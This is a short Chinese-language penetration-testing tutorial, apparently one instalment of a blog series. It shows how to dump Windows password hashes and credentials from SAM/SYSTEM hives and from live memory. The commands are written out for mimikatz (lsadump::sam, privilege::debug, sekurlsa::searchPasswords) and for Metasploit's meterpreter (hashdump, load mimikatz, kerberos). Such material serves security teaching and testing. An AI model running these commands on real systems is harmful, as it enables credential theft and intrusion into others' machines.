专注APT攻击与防御
https://micropoor.blogspot.com/

上一季下载sys.hiv,sam.hiv,security.hiv文件后，以Linux下为背景来离线提取hash，本季补充以windows为背景离线提取hash。

mimikatz 2.0二进制文件下载地址：
https://github.com/gentilkiwi/mimikatz/releases/latest
切到当下目录（注意X86,X64位）

mimikatz离线导hash命令：
`mimikatz.exe "lsadump::sam /system:sys.hiv /sam:sam.hiv" exit`

![](media/92ae7706ceec3aa04bce07e08ced2e16.jpg)

mimikatz在线导hash命令：

`mimikatz.exe "log Micropoor.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"`

![](media/88ab6bceca9f6a733b768b1ccfefe688.jpg)

当然关于提取目标机的hash，msf也内置了离线提取与在线提取hash。

meterpreter下hashdump命令来提取hash（注意当前权限）
![](media/79e0ae6ee3518126f0c11872201c70fb.jpg)
![](media/5808e7c6ac005d96f8289f994db6e45e.jpg)

msf同时也内置了mimikatz，meterpreter执行load mimikatz即可加载该插件。**（这里一定要注意，msf默认调用于payload位数相同的mimikatz）**
![](media/3535a826c17c149f290fd79bd2fe865a.jpg)

直接执行kerberos即可。
![](media/0134f11ff22c5d4450f173c8e5ce9717.jpg)

当然有些情况下，payload位数无误，权限无误，依然无法提取目标机的密码相关。需要调用mimikatz自定义命令：
`mimikatz_command -f sekurlsa::searchPasswords`
![](media/ae5d3f87f6df54f4a42bfa231e5847c0.jpg)

>   Micropoor
